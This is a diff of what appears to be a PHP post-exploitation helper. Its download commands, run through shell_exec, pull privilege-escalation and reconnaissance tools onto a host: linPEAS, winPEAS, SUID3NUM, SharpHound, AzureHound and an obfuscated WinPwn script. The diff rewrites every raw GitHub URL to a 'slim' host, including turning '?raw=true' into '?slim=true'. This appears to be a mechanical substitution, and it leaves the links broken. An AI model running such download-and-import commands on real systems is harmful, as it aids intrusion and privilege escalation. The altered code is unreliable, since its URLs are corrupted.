@@ -200,10 +200,10 @@ function checkPack()
 function cloner($repo, $os)
 {
     $repos = array(
-        "linux" => "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh",
-        "WinBAT" => "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat",
+        "linux" => "https://slim.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh",
+        "WinBAT" => "https://slim.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat",
         "WinEXEANY" => "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe",
-        "default" => "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py"
+        "default" => "https://slim.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py"
     );
     $windefault = $repos['WinBAT'];
     $linDefault = $repo['linux'];
@@ -338,17 +338,17 @@ function windows($com, $r)
             switch (strtolower($com)) {
                 case "bh":
                     echo("Pulling SharpHound..\n");
-                    shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile af.ps1");
+                    shell_exec("Invoke-WebRequest -Uri https://slim.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1 -OutFile af.ps1");
                     echo("\nFile downloaded to: " . $cdir . " af.ps1");
                     break;
                 case "azh":
                     echo("Pulling Azurehound...\n");
-                    shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile af1.ps1");
+                    shell_exec("Invoke-WebRequest -Uri https://slim.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/AzureHound.ps1 -OutFile af1.ps1");
                     echo("\nFile downloaded to: " . $cdir . " af1.ps1");
                     break;
                 case "bhe":
                     echo("Pulling Bloodhound Executable!\n");
-                    shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?raw=true -OutFile af2.exe");
+                    shell_exec("Invoke-WebRequest -Uri https://slim.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.exe?slim=true -OutFile af2.exe");
                     echo("\nFile downloaded to: " . $cdir . " af2.ps1");
                     break;
                 case "ncW":
@@ -366,13 +366,13 @@ function windows($com, $r)
 					break;
 				case "wpwn":
 					echo("Pulling down WinPWN.\n");
-					shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1 -OutFile wpwn.ps1");
+					shell_exec("Invoke-WebRequest -Uri https://slim.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/WinPwn.ps1 -OutFile wpwn.ps1");
                     echo("\nFile downloaded to: " . $cdir . " wpwn.ps1");
 					shell_exec("Import Module .\wpwn.ps1");
                     break;
 				case "wpwns":
 					echo("Pulling down WinPWN ObSecure.\n");
-					shell_exec("Invoke-WebRequest -Uri https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Obfus_SecurePS_WinPwn.ps1 -OutFile wpwns.ps1");
+					shell_exec("Invoke-WebRequest -Uri https://slim.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/master/Obfus_SecurePS_WinPwn.ps1 -OutFile wpwns.ps1");
                     echo("\nFile downloaded to: " . $cdir . " wpwns.ps1");
 					shell_exec("Import Module .\wpwns.ps1");
                     break;
